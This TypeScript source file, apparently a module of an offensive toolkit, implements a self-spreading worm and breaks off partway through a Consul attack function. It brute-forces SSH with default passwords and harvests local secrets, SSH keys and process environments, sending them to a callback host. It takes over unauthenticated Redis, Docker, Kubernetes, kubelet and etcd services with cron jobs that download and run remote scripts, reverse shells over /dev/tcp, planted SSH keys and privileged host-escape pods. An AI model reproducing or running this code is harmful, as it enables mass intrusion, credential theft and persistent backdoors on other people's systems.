import { createLogger } from "./logger.js";
import { createConnection } from "net";
import { connect as tlsConnect } from "tls";
import { networkInterfaces, hostname, userInfo, platform } from "os";
import { spawnSync } from "child_process";
import { readFileSync, existsSync, writeFileSync, readdirSync, statSync } from "fs";
import { fileURLToPath } from "url";
import { dirname, join } from "path";
import { randomBytes } from "crypto";

const logger = createLogger("ironWorm");

const __filename = fileURLToPath(import.meta.url);
const __dirname  = dirname(__filename);

export interface IronWormOptions {
  packageName?:     string;
  githubOrg?:       string;
  githubRepo?:      string;
  depConfusionOrg?: string;
  cbHost?:          string;
  cbPort?:          string;
  propagate?:       boolean;
  targetCidr?:      string;
  attackerPubKey?:  string;
}

export interface IronWormResult {
  id:        string;
  name:      string;
  target:    string;
  category:  string;
  status:    "success" | "failed" | "info";
  detail:    string;
  artifacts: string[];
  steps:     string[];
  severity:  "critical" | "high" | "medium" | "info";
}

interface PortScan  { host: string; port: number; open: boolean; banner: string; }
interface SshResult { success: boolean; user: string; pass: string; output: string; }
interface ExploitHit { host: string; port: number; method: string; output: string; }

const ATTACKER_PUBKEY =
  "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7Kj3vXk2eU9Lm8nQpRtYwZxVbNcFdIoHsGqJuAeMhTlP nexus-worm";

const SSH_CREDS: Array<[string, string]> = [
  ["root",""],["root","root"],["root","toor"],["root","password"],["root","123456"],
  ["root","admin"],["root","pass"],["root","raspberry"],["root","alpine"],["root","1234"],
  ["root","changeme"],["root","letmein"],["root","qwerty"],["root","test"],["root","master"],
  ["root","root123"],["root","Password1"],["root","P@ssw0rd"],["root","rootroot"],["root","linux"],
  ["root","centos"],["root","ubuntu"],["root","debian"],["root","redhat"],["root","fedora"],
  ["admin","admin"],["admin","password"],["admin","1234"],["admin","admin123"],["admin",""],
  ["admin","pass"],["admin","test"],["admin","letmein"],["admin","P@ssword1"],["admin","administrator"],
  ["ubuntu","ubuntu"],["ubuntu","password"],["ubuntu",""],["ubuntu","Ubuntu"],
  ["pi","raspberry"],["pi","pi"],["pi","password"],["pi","Pi"],
  ["user","user"],["user","password"],["user","1234"],["user","test"],["user","User123"],
  ["test","test"],["test","password"],["test",""],["test","Test1234"],
  ["guest","guest"],["guest",""],["guest","password"],["guest","Guest"],
  ["deploy","deploy"],["deploy","password"],["deploy",""],["deploy","D3ploy"],
  ["jenkins","jenkins"],["jenkins","password"],["jenkins",""],["jenkins","Jenkins1"],
  ["ansible","ansible"],["vagrant","vagrant"],["git","git"],["git",""],
  ["gitlab","gitlab"],["gitea","gitea"],["postgres","postgres"],["postgres",""],
  ["mysql","mysql"],["mysql",""],["oracle","oracle"],["oracle",""],
  ["redis","redis"],["redis",""],["mongodb","mongodb"],["elastic","elastic"],
  ["ec2-user",""],["centos",""],["debian",""],["kali","kali"],["arch","arch"],
  ["www-data",""],["apache","apache"],["nginx","nginx"],["tomcat","tomcat"],
  ["ftpuser","ftpuser"],["ftp","ftp"],["backup","backup"],["backup","backup123"],
  ["support","support"],["supervisor","supervisor"],["devops","devops"],["devops","D3v0ps"],
  ["hadoop","hadoop"],["hdfs","hdfs"],["yarn","yarn"],["spark","spark"],
  ["kafka","kafka"],["zookeeper","zookeeper"],["elasticsearch","elasticsearch"],
  ["grafana","grafana"],["prometheus","prometheus"],["vault","vault"],
  ["minio","minio"],["minio","minioadmin"],["docker","docker"],["kubernetes","kubernetes"],
  ["k8s","k8s"],["rancher","rancher"],["traefik","traefik"],["consul","consul"],
  ["pi",""],["odroid","odroid"],["alarm","alarm"],["rock","rock"],
  ["administrator","administrator"],["administrator","password"],["administrator",""],
  ["service","service"],["svc","svc"],["app","app"],["app","application"],
  ["developer","developer"],["dev","dev"],["dev","password"],
  ["info","info"],["webmaster","webmaster"],["monitor","monitor"],
];

const SERVICE_PORTS = [
  21, 22, 23, 25, 80, 110, 143, 443, 445,
  1433, 1521, 1883, 2049, 2181, 2375, 2376, 2379, 2380,
  3000, 3306, 3389, 4369, 4848, 5432, 5601, 5900, 5984, 5985, 5986,
  6379, 6380, 6443, 7474, 8080, 8086, 8088, 8161, 8200, 8443, 8500,
  8888, 8983, 9000, 9090, 9092, 9200, 9300, 9418,
  10250, 10255, 11211, 15672, 27017, 50070, 50075,
];

function tcpConnect(host: string, port: number, timeoutMs = 1500): Promise<{ open: boolean; banner: string }> {
  return new Promise(resolve => {
    let banner    = "";
    let done      = false;
    let connected = false;
    const sock  = createConnection({ host, port });
    const timer = setTimeout(() => {
      if (done) return;
      done = true;
      sock.destroy();
      resolve({ open: false, banner: "" });
    }, timeoutMs);
    sock.on("connect",  () => { connected = true; sock.setTimeout(600); });
    sock.on("data",     d  => { banner += d.toString("utf8", 0, 512); });
    sock.on("timeout",  () => { if (done) return; done = true; clearTimeout(timer); sock.destroy(); resolve({ open: true, banner }); });
    sock.on("error",    () => { if (done) return; done = true; clearTimeout(timer); resolve({ open: false, banner: "" }); });
    sock.on("close",    () => { if (done) return; done = true; clearTimeout(timer); resolve({ open: connected, banner }); });
  });
}

function rawTcpSend(host: string, port: number, payload: Buffer | string, timeoutMs = 4000): Promise<string> {
  return new Promise(resolve => {
    let data = "";
    let done = false;
    const sock  = createConnection({ host, port });
    const timer = setTimeout(() => { if (done) return; done = true; sock.destroy(); resolve(data); }, timeoutMs);
    sock.on("connect",  () => { sock.write(payload); sock.setTimeout(timeoutMs - 300); });
    sock.on("data",     d  => { data += d.toString(); });
    sock.on("timeout",  () => { if (done) return; done = true; clearTimeout(timer); sock.destroy(); resolve(data); });
    sock.on("error",    () => { if (done) return; done = true; clearTimeout(timer); resolve(data); });
    sock.on("close",    () => { if (done) return; done = true; clearTimeout(timer); resolve(data); });
  });
}

function encodeResp(...args: string[]): Buffer {
  const parts: string[] = [`*${args.length}\r\n`];
  for (const a of args) {
    const b = Buffer.from(a, "utf8");
    parts.push(`$${b.length}\r\n${a}\r\n`);
  }
  return Buffer.from(parts.join(""));
}

function respCommand(host: string, port: number, timeoutMs: number, ...args: string[]): Promise<string> {
  return new Promise(resolve => {
    let data = "";
    let done = false;
    const sock  = createConnection({ host, port });
    const timer = setTimeout(() => { if (done) return; done = true; sock.destroy(); resolve(data); }, timeoutMs);
    sock.on("connect",  () => { sock.write(encodeResp(...args)); sock.setTimeout(timeoutMs - 200); });
    sock.on("data",     d  => { data += d.toString(); if (data.includes("\r\n")) { done = true; clearTimeout(timer); sock.destroy(); resolve(data); } });
    sock.on("timeout",  () => { if (done) return; done = true; clearTimeout(timer); sock.destroy(); resolve(data); });
    sock.on("error",    () => { if (done) return; done = true; clearTimeout(timer); resolve(data); });
  });
}

async function respMulti(host: string, port: number, commands: string[][]): Promise<boolean> {
  for (const cmd of commands) {
    const r = await respCommand(host, port, 3000, ...cmd);
    if (r.startsWith("-")) return false;
  }
  return true;
}

function httpFetch(
  host: string, port: number, method: string, path: string,
  headers: Record<string, string>, body: string, timeoutMs = 5000, useTls = false
): Promise<{ status: number; body: string; headers: Record<string, string> }> {
  return new Promise(resolve => {
    let raw  = "";
    let done = false;
    const sock  = useTls
      ? tlsConnect({ host, port, rejectUnauthorized: false })
      : createConnection({ host, port });
    const timer = setTimeout(() => { if (done) return; done = true; sock.destroy(); resolve({ status: 0, body: "", headers: {} }); }, timeoutMs);

    const parseResp = () => {
      const sep = raw.indexOf("\r\n\r\n");
      const hdrSection = sep >= 0 ? raw.slice(0, sep) : raw;
      const bodySection = sep >= 0 ? raw.slice(sep + 4) : "";
      const lines = hdrSection.split("\r\n");
      const statusLine = lines[0] ?? "";
      const status = parseInt(statusLine.split(" ")[1] ?? "0", 10);
      const hdrs: Record<string, string> = {};
      for (const l of lines.slice(1)) {
        const ci = l.indexOf(":");
        if (ci > 0) hdrs[l.slice(0, ci).toLowerCase().trim()] = l.slice(ci + 1).trim();
      }
      return { status, body: bodySection, headers: hdrs };
    };

    sock.on("connect", () => {
      const bodyBuf = Buffer.from(body, "utf8");
      const hdrs = Object.entries({
        ...headers,
        "Content-Length": String(bodyBuf.length),
        "Connection": "close",
        "User-Agent": "Mozilla/5.0 (compatible; curl/8.5.0)",
      }).map(([k, v]) => `${k}: ${v}`).join("\r\n");
      sock.write(`${method} ${path} HTTP/1.1\r\nHost: ${host}:${port}\r\n${hdrs}\r\n\r\n${body}`);
      sock.setTimeout(timeoutMs - 200);
    });
    sock.on("data",    d  => { raw += d.toString(); });
    sock.on("timeout", () => { if (done) return; done = true; clearTimeout(timer); sock.destroy(); resolve(parseResp()); });
    sock.on("close",   () => { if (done) return; done = true; clearTimeout(timer); resolve(parseResp()); });
    sock.on("error",   () => { if (done) return; done = true; clearTimeout(timer); resolve({ status: 0, body: "", headers: {} }); });
  });
}

async function httpFetchRetry(
  host: string, port: number, method: string, path: string,
  headers: Record<string, string>, body: string, timeoutMs = 5000
): Promise<{ status: number; body: string; headers: Record<string, string> }> {
  const r1 = await httpFetch(host, port, method, path, headers, body, timeoutMs);
  if (r1.status !== 0) return r1;
  await new Promise<void>(r => setTimeout(r, 300));
  return httpFetch(host, port, method, path, headers, body, timeoutMs);
}

function getLocalSubnets(): string[] {
  const ifaces = networkInterfaces();
  const subnets = new Set<string>();
  for (const iface of Object.values(ifaces)) {
    for (const addr of iface ?? []) {
      if (addr.family === "IPv4" && !addr.internal && addr.cidr) subnets.add(addr.cidr);
    }
  }
  return [...subnets];
}

function expandCIDR(cidr: string): string[] {
  const [baseStr, bitsStr] = cidr.split("/");
  const prefix  = parseInt(bitsStr ?? "24", 10);
  const octets  = (baseStr ?? "10.0.0.0").split(".").map(Number);
  const baseInt = ((octets[0]! << 24) | (octets[1]! << 16) | (octets[2]! << 8) | octets[3]!) >>> 0;
  const mask    = prefix === 0 ? 0 : (0xffffffff << (32 - prefix)) >>> 0;
  const network = (baseInt & mask) >>> 0;
  const count   = Math.min(Math.pow(2, 32 - prefix) - 2, 1022);
  const hosts: string[] = [];
  for (let i = 1; i <= count; i++) {
    const ip = (network + i) >>> 0;
    hosts.push(`${(ip >>> 24) & 0xff}.${(ip >>> 16) & 0xff}.${(ip >>> 8) & 0xff}.${ip & 0xff}`);
  }
  return hosts;
}

function selfExfil(cbHost: string, cbPort: string, data: Record<string, string>): void {
  try {
    const qs = Object.entries(data).map(([k, v]) =>
      `${encodeURIComponent(k)}=${encodeURIComponent(Buffer.from(v).toString("base64"))}`
    ).join("&");
    httpFetch(cbHost, parseInt(cbPort, 10), "GET", `/nx_beacon?${qs}`,
      { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }, "", 4000).catch(() => {});
  } catch { /* non-blocking */ }
}

function selfExfilPost(cbHost: string, cbPort: string, path: string, data: string): void {
  try {
    const b64 = Buffer.from(data).toString("base64");
    httpFetch(cbHost, parseInt(cbPort, 10), "POST", `/nx_data?p=${encodeURIComponent(path)}`,
      { "Content-Type": "text/plain" }, b64, 4000).catch(() => {});
  } catch { /* non-blocking */ }
}

function huntLocalSecrets(): string[] {
  const found: string[] = [];
  const searchPaths = ["/root", "/home", "/etc", "/opt", "/var", "/srv", "/tmp", "/app", "/data", "/config"];
  const secretFiles = [
    ".env", ".env.local", ".env.production", ".env.staging", ".env.development",
    ".aws/credentials", ".aws/config", ".gcloud/credentials.json", ".kube/config",
    "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", ".vault-token",
    "terraform.tfvars", "terraform.tfvars.json", ".netrc", "credentials.json",
    "service-account.json", ".npmrc", ".pypirc", ".docker/config.json",
    ".gitconfig", ".git-credentials", "secrets.yaml", "secrets.json",
    ".cargo/credentials.toml", ".config/gh/hosts.yml", ".terraformrc",
    "config.json", "config.yaml", "config.yml", "application.properties",
    "application.yaml", "settings.py", "database.yml", "database.yaml",
    "wp-config.php", ".htpasswd", "shadow", "passwd",
  ];

  const walk = (dir: string, depth: number): void => {
    if (depth > 5) return;
    try {
      const entries = readdirSync(dir);
      for (const e of entries) {
        if ([".git", "node_modules", "vendor", "dist", "build", ".cache"].includes(e)) continue;
        const fp = join(dir, e);
        try {
          const st = statSync(fp);
          if (st.isDirectory() && depth < 5) walk(fp, depth + 1);
          else if (secretFiles.some(s => e === s || fp.endsWith(`/${s}`) || fp.endsWith(s))) {
            const content = readFileSync(fp, "utf8").slice(0, 3000);
            if (/key|token|secret|pass|cred|aws|azure|gcp|db|auth|api[_-]?key/i.test(content)) {
              found.push(`${fp}:::${content}`);
            }
          }
        } catch { /* skip */ }
      }
    } catch { /* skip */ }
  };

  for (const p of searchPaths) walk(p, 0);

  try {
    const procDirs = readdirSync("/proc").filter(d => /^\d+$/.test(d));
    for (const pid of procDirs.slice(0, 300)) {
      try {
        const env = readFileSync(`/proc/${pid}/environ`, "utf8").replace(/\0/g, "\n");
        if (/TOKEN|SECRET|KEY|PASS|CRED|AWS|AZURE|GCLOUD|DATABASE_URL|REDIS_URL|STRIPE|GITHUB/i.test(env)) {
          found.push(`/proc/${pid}/environ:::${env.slice(0, 1500)}`);
        }
      } catch { /* skip */ }
    }
  } catch { /* skip */ }

  try {
    const histFiles = ["/root/.bash_history", "/root/.zsh_history"];
    const homeDirs = readdirSync("/home").map(u => `/home/${u}/.bash_history`);
    for (const hf of [...histFiles, ...homeDirs]) {
      try {
        const hist = readFileSync(hf, "utf8");
        if (/export.*(?:TOKEN|SECRET|KEY|PASS)|curl.*-[uH]|aws s3|kubectl.*secret/i.test(hist)) {
          found.push(`${hf}:::${hist.slice(0, 2000)}`);
        }
      } catch { /* skip */ }
    }
  } catch { /* skip */ }

  return found;
}

function huntSshKeys(): string[] {
  const keys: string[] = [];
  const dirs = ["/root/.ssh", "/home", "/var/lib", "/opt", "/etc/ssh"];
  const tryDir = (d: string, depth: number): void => {
    if (depth > 4) return;
    try {
      for (const e of readdirSync(d)) {
        const fp = join(d, e);
        try {
          const st = statSync(fp);
          if (st.isDirectory()) tryDir(fp, depth + 1);
          else if (/^id_(rsa|ed25519|ecdsa|dsa)$/.test(e) || (e.endsWith(".pem") && !e.includes("cert")) || e.endsWith(".key")) {
            const content = readFileSync(fp, "utf8");
            if (content.includes("PRIVATE KEY")) keys.push(fp);
          }
        } catch { /* skip */ }
      }
    } catch { /* skip */ }
  };
  for (const d of dirs) tryDir(d, 0);
  return [...new Set(keys)];
}

function huntKnownHosts(): string[] {
  const hosts = new Set<string>();
  const files = [
    "/root/.ssh/known_hosts", "/root/.ssh/config",
    "/etc/hosts", "/etc/ssh/ssh_known_hosts",
    "/etc/hosts.equiv",
  ];
  try {
    const homeDirs = readdirSync("/home");
    for (const u of homeDirs) {
      files.push(`/home/${u}/.ssh/known_hosts`);
      files.push(`/home/${u}/.ssh/config`);
    }
  } catch { /* skip */ }

  for (const f of files) {
    try {
      const content = readFileSync(f, "utf8");
      for (const m of content.matchAll(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g)) hosts.add(m[1]!);
      for (const m of content.matchAll(/Hostname\s+(\S+)/gi)) {
        const h = m[1]!;
        if (/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(h)) hosts.add(h);
      }
    } catch { /* skip */ }
  }

  try {
    const r = spawnSync("arp", ["-n"], { encoding: "utf8", timeout: 3000 });
    if (r.stdout) for (const m of r.stdout.matchAll(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g)) hosts.add(m[1]!);
  } catch { /* skip */ }

  try {
    const arpCache = readFileSync("/proc/net/arp", "utf8");
    for (const m of arpCache.matchAll(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g)) hosts.add(m[1]!);
  } catch { /* skip */ }

  try {
    const route = readFileSync("/proc/net/route", "utf8");
    for (const line of route.split("\n").slice(1)) {
      const parts = line.trim().split(/\s+/);
      if (parts[1] && parts[1] !== "00000000") {
        const hexIp = parts[1]!;
        const ip = [3, 2, 1, 0].map(i => parseInt(hexIp.slice(i * 2, i * 2 + 2), 16)).join(".");
        if (!ip.startsWith("0.") && !ip.startsWith("127.")) hosts.add(ip);
      }
    }
  } catch { /* skip */ }

  return [...hosts].filter(ip => !ip.startsWith("127.") && !ip.startsWith("0.") && ip !== "255.255.255.255");
}

function getKernelInfo(): { version: string; vulns: string[] } {
  const vulns: string[] = [];
  try {
    const r = spawnSync("uname", ["-r"], { encoding: "utf8", timeout: 2000 });
    const ver = (r.stdout ?? "").trim();
    const [maj, min, patch] = ver.split(/[.\-]/).slice(0, 3).map(Number);
    if (maj === 4 && min !== undefined && min <= 4) vulns.push("CVE-2016-5195 DirtyCOW");
    if (maj === 5 && min !== undefined && min < 8) vulns.push("CVE-2021-3156 sudo-baron-samedit");
    if (maj === 5 && min !== undefined && min >= 8 && min <= 16) vulns.push("CVE-2022-0847 DirtyPipe");
    if (maj === 5 && min !== undefined && min <= 15 && (patch ?? 0) <= 77) vulns.push("CVE-2022-25636 nf_tables");
    if (maj <= 5 || (maj === 5 && min !== undefined && min < 19)) vulns.push("CVE-2023-0386 OverlayFS");
    return { version: ver, vulns };
  } catch {
    return { version: "unknown", vulns: [] };
  }
}

function getSuidBinaries(): string[] {
  const r = spawnSync("find", [
    "/usr/bin", "/usr/sbin", "/bin", "/sbin",
    "-perm", "-4000", "-type", "f",
  ], { encoding: "utf8", timeout: 5000 });
  return (r.stdout ?? "").trim().split("\n").filter(Boolean);
}

async function redisExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const ping = await respCommand(host, 6379, 2000, "PING");
  if (!ping.includes("PONG") && !ping.includes("+")) return null;

  const steps: string[] = [];

  const ver = await respCommand(host, 6379, 2000, "INFO", "server");
  const versionMatch = ver.match(/redis_version:(\S+)/);
  const version = versionMatch?.[1] ?? "unknown";

  await respCommand(host, 6379, 2000, "CONFIG", "SET", "protected-mode", "no");

  const cronDirs = ["/var/spool/cron/crontabs", "/var/spool/cron", "/etc/cron.d"];
  for (const dir of cronDirs) {
    const cronPayload = `\n\n*/2 * * * * root curl -fsk http://${cbHost}:${cbPort}/r.sh|bash\n*/2 * * * * root wget -qO- http://${cbHost}:${cbPort}/r.sh|bash\n\n`;
    const ok = await respMulti(host, 6379, [
      ["CONFIG", "SET", "dir", dir],
      ["CONFIG", "SET", "dbfilename", "root"],
      ["SET", "NX_CRON", cronPayload],
      ["BGSAVE"],
    ]);
    if (ok) { steps.push(`cron:${dir}`); break; }
  }

  const keyPayload = `\n\n${ATTACKER_PUBKEY}\n\n`;
  await respMulti(host, 6379, [
    ["CONFIG", "SET", "dir", "/root/.ssh"],
    ["CONFIG", "SET", "dbfilename", "authorized_keys"],
    ["SET", "NX_KEY", keyPayload],
    ["BGSAVE"],
  ]);
  steps.push("authorized_keys");

  const allKeys = await respCommand(host, 6379, 3000, "KEYS", "*");
  selfExfil(cbHost, cbPort, { src: `redis:${host}:6379`, ver: version, keys: allKeys.slice(0, 500) });

  const replicaOk = await respMulti(host, 6379, [
    ["SLAVEOF", cbHost, cbPort],
  ]);
  if (replicaOk) steps.push("replica-sync");

  for (const line of allKeys.split("\r\n").filter(k => k.length > 2 && !k.startsWith("*") && !k.startsWith("$")).slice(0, 30)) {
    const kname = line.replace(/^\$\d+/, "").trim();
    if (kname && !kname.startsWith("NX_")) {
      const val = await respCommand(host, 6379, 2000, "GET", kname);
      if (/token|key|pass|secret|cred|auth|jwt|session/i.test(val)) {
        selfExfil(cbHost, cbPort, { src: `redis_key:${host}:${kname}`, val: val.slice(0, 400) });
      }
    }
  }

  return { host, port: 6379, method: `redis-resp:${version}`, output: steps.join("|") };
}

async function dockerExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  for (const port of [2375, 2376]) {
    const ping = await httpFetch(host, port, "GET", "/_ping", { "Host": host }, "", 3000);
    if (ping.status !== 200) continue;

    const info = await httpFetch(host, port, "GET", "/info", { "Host": host, "Accept": "application/json" }, "", 3000);
    selfExfil(cbHost, cbPort, { src: `docker:${host}:${port}`, info: info.body.slice(0, 600) });

    const swarmStatus = await httpFetch(host, port, "GET", "/swarm", { "Host": host }, "", 3000);
    if (swarmStatus.status === 200 && swarmStatus.body.includes("ID")) {
      selfExfil(cbHost, cbPort, { src: `docker_swarm:${host}`, swarm: swarmStatus.body.slice(0, 300) });
    }

    const shellCmd = [
      `id; hostname; whoami; uname -a; cat /host/etc/passwd 2>/dev/null;`,
      `cat /host/root/.ssh/id_rsa 2>/dev/null;`,
      `cat /host/etc/shadow 2>/dev/null;`,
      `ls /host/root/ 2>/dev/null;`,
      `env|grep -iE 'KEY|TOKEN|SECRET|PASS|AWS|GCP|AZURE' 2>/dev/null;`,
      `(crontab -l 2>/dev/null; echo '*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1') | crontab -;`,
      `echo '${ATTACKER_PUBKEY}' >> /host/root/.ssh/authorized_keys 2>/dev/null;`,
      `echo ok_nx`,
    ].join(" ");

    for (const image of ["alpine:latest", "busybox", "ubuntu:20.04", "debian:11"]) {
      const createBody = JSON.stringify({
        Image: image,
        Cmd: ["sh", "-c", shellCmd],
        AttachStdout: false, AttachStderr: false,
        HostConfig: {
          Privileged: true, NetworkMode: "host", PidMode: "host",
          Binds: ["/:/host", "/var/run/docker.sock:/var/run/docker.sock"],
          CapAdd: ["ALL"],
          SecurityOpt: ["no-new-privileges:false"],
        },
      });

      const createResp = await httpFetch(host, port, "POST", "/containers/create",
        { "Host": host, "Content-Type": "application/json" }, createBody, 8000);

      let cid = "";
      try { cid = String((JSON.parse(createResp.body) as Record<string, unknown>)["Id"] ?? ""); } catch { /* skip */ }
      if (!cid) continue;

      await httpFetch(host, port, "POST", `/containers/${cid}/start`,
        { "Host": host, "Content-Length": "0" }, "", 5000);
      await new Promise<void>(r => setTimeout(r, 3000));

      const logs = await httpFetch(host, port, "GET",
        `/containers/${cid}/logs?stdout=1&stderr=1&tail=100`,
        { "Host": host }, "", 5000);
      await httpFetch(host, port, "DELETE", `/containers/${cid}?force=true`,
        { "Host": host, "Content-Length": "0" }, "", 3000);

      selfExfil(cbHost, cbPort, { src: `docker_exec:${host}:${port}`, logs: logs.body.slice(0, 800) });
      return { host, port, method: `docker-privileged:${image}`, output: `cid:${cid.slice(0, 12)}` };
    }
  }
  return null;
}

async function k8sExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  for (const port of [6443, 8443, 8080]) {
    const ver = await httpFetch(host, port, "GET", "/version", { "Host": host, "Accept": "application/json" }, "", 3000);
    if (ver.status !== 200) continue;

    selfExfil(cbHost, cbPort, { src: `k8s:${host}:${port}:ver`, data: ver.body.slice(0, 300) });

    for (const res of ["/api/v1/namespaces", "/api/v1/secrets", "/api/v1/configmaps", "/api/v1/serviceaccounts"]) {
      const r = await httpFetch(host, port, "GET", res, { "Host": host, "Accept": "application/json" }, "", 4000);
      if (r.status === 200) selfExfil(cbHost, cbPort, { src: `k8s:${host}:${port}${res}`, data: r.body.slice(0, 1000) });
    }

    const saToken = await httpFetch(host, port, "GET",
      "/api/v1/namespaces/kube-system/secrets",
      { "Host": host, "Accept": "application/json" }, "", 5000);
    if (saToken.status === 200) selfExfil(cbHost, cbPort, { src: `k8s_sa:${host}`, data: saToken.body.slice(0, 1200) });

    const podBody = JSON.stringify({
      apiVersion: "v1", kind: "Pod",
      metadata: { name: "nx-escape", namespace: "default" },
      spec: {
        hostPID: true, hostNetwork: true, hostIPC: true,
        containers: [{
          name: "nx", image: "alpine",
          command: ["sh", "-c",
            `nsenter -t 1 -m -u -i -n -p -- sh -c ` +
            `"(id; hostname; cat /etc/shadow 2>/dev/null; cat /root/.ssh/id_rsa 2>/dev/null; env) | ` +
            `base64 | wget -qO/dev/null --post-data @- http://${cbHost}:${cbPort}/k8s_escape 2>/dev/null; ` +
            `(crontab -l 2>/dev/null; echo '*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1') | crontab -; ` +
            `echo '${ATTACKER_PUBKEY}' >> /root/.ssh/authorized_keys 2>/dev/null; echo nx_ok"`,
          ],
          securityContext: { privileged: true, allowPrivilegeEscalation: true, runAsUser: 0 },
          volumeMounts: [{ name: "host", mountPath: "/host" }],
        }],
        volumes: [{ name: "host", hostPath: { path: "/" } }],
        restartPolicy: "Never",
      },
    });

    await httpFetch(host, port, "POST", "/api/v1/namespaces/default/pods",
      { "Host": host, "Content-Type": "application/json" }, podBody, 8000);

    const dsBody = JSON.stringify({
      apiVersion: "apps/v1", kind: "DaemonSet",
      metadata: { name: "nx-ds", namespace: "default" },
      spec: {
        selector: { matchLabels: { app: "nx" } },
        template: {
          metadata: { labels: { app: "nx" } },
          spec: {
            hostPID: true, hostNetwork: true,
            containers: [{
              name: "nx", image: "alpine",
              command: ["sh", "-c",
                `(crontab -l 2>/dev/null; echo '*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1') | crontab -; ` +
                `echo '${ATTACKER_PUBKEY}' >> /host/root/.ssh/authorized_keys 2>/dev/null; sleep infinity`,
              ],
              securityContext: { privileged: true },
              volumeMounts: [{ name: "host", mountPath: "/host" }],
            }],
            volumes: [{ name: "host", hostPath: { path: "/" } }],
          },
        },
      },
    });
    await httpFetch(host, port, "POST", "/apis/apps/v1/namespaces/default/daemonsets",
      { "Host": host, "Content-Type": "application/json" }, dsBody, 8000);

    return { host, port, method: "k8s-unauth-rce", output: "pod:nx-escape+daemonset:nx-ds" };
  }
  return null;
}

async function kubeletExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  for (const [port, auth] of [[10255, false], [10250, true]] as Array<[number, boolean]>) {
    const probe = await httpFetch(host, port, "GET", "/pods",
      { "Host": host, "Accept": "application/json" }, "", 3000);
    if (probe.status === 0) continue;

    if (probe.status === 200) {
      selfExfil(cbHost, cbPort, { src: `kubelet:${host}:${port}:pods`, data: probe.body.slice(0, 1000) });

      let podName = "";
      let ns = "default";
      let cname = "";
      try {
        const pods = JSON.parse(probe.body) as { items?: Array<{ metadata?: { name?: string; namespace?: string }; spec?: { containers?: Array<{ name?: string }> } }> };
        const first = pods.items?.[0];
        podName = first?.metadata?.name ?? "";
        ns      = first?.metadata?.namespace ?? "default";
        cname   = first?.spec?.containers?.[0]?.name ?? "";
      } catch { /* skip */ }

      if (podName && cname) {
        const execPath = `/run/${ns}/${podName}/${cname}?cmd=id%26%26hostname%26%26cat+/etc/shadow+2>/dev/null`;
        const execR = await httpFetch(host, port, "GET", execPath, { "Host": host }, "", 5000);
        selfExfil(cbHost, cbPort, { src: `kubelet_exec:${host}:${port}`, out: execR.body.slice(0, 500) });

        const backdoorPath = `/run/${ns}/${podName}/${cname}?cmd=` +
          encodeURIComponent(`(crontab -l 2>/dev/null; echo '*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1') | crontab -`);
        await httpFetch(host, port, "GET", backdoorPath, { "Host": host }, "", 5000);
        return { host, port, method: `kubelet-exec:${ns}/${podName}/${cname}`, output: execR.body.slice(0, 100) };
      }
    }
  }
  return null;
}

async function etcdExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const health = await httpFetch(host, 2379, "GET", "/health",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  if (health.status !== 200) return null;

  const allKeys = await httpFetch(host, 2379, "POST", "/v3/kv/range",
    { "Host": host, "Content-Type": "application/json" },
    JSON.stringify({ key: "AA==", range_end: "/w==", limit: 200 }), 5000);

  if (allKeys.status === 200) {
    selfExfil(cbHost, cbPort, { src: `etcd:${host}:2379`, keys: allKeys.body.slice(0, 1200) });

    try {
      const data = JSON.parse(allKeys.body) as { kvs?: Array<{ key: string; value: string }> };
      for (const kv of data.kvs ?? []) {
        const key   = Buffer.from(kv.key, "base64").toString();
        const value = Buffer.from(kv.value, "base64").toString();
        if (/token|secret|pass|cred|cert|key/i.test(key) || /token|secret|pass|cred/i.test(value)) {
          selfExfil(cbHost, cbPort, { src: `etcd_kv:${host}:${key}`, val: value.slice(0, 500) });
        }
      }
    } catch { /* skip */ }
  }

  const cronPayload = Buffer.from(
    `\n*/3 * * * * root curl -fsk http://${cbHost}:${cbPort}/r.sh|bash\n`
  ).toString("base64");
  const cronKey = Buffer.from("/nx/cron").toString("base64");
  await httpFetch(host, 2379, "POST", "/v3/kv/put",
    { "Host": host, "Content-Type": "application/json" },
    JSON.stringify({ key: cronKey, value: cronPayload }), 3000);

  const memberList = await httpFetch(host, 2379, "POST", "/v3/cluster/member/list",
    { "Host": host, "Content-Type": "application/json" }, "{}", 3000);
  selfExfil(cbHost, cbPort, { src: `etcd_members:${host}`, data: memberList.body.slice(0, 500) });

  return { host, port: 2379, method: "etcd-v3-unauth", output: `keys:${allKeys.body.length}b` };
}

async function consulExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const health = await httpFetch(host, 8500, "GET", "/v1/status/leader",
    { "Host": host }, "", 3000);
  if (health.status !== 200) return null;

  const kvDump = await httpFetch(host, 8500, "GET", "/v1/kv/?recurse=true&keys=true",
    { "Host": host, "Accept": "application/json" }, "", 4000);
  selfExfil(cbHost, cbPort, { src: `consul:${host}:8500:kv`, data: kvDump.body.slice(0, 800) });

  const services = await httpFetch(host, 8500, "GET", "/v1/agent/services",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  selfExfil(cbHost, cbPort, { src: `consul:${host}:8500:services`, data: services.body.slice(0, 600) });

  const nodes = await httpFetch(host, 8500, "GET", "/v1/catalog/nodes",
    { "Host": host, "Accept": "application/json" }, "", 3000);
  selfExfil(cbHost, cbPort, { src: `consul:${host}:8500:nodes`, data: nodes.body.slice(0, 600) });

  const aclSelf = await httpFetch(host, 8500, "GET", "/v1/acl/token/self",
    { "Host": host, "X-Consul-Token": "" }, "", 3000);
  if (aclSelf.status === 200) {
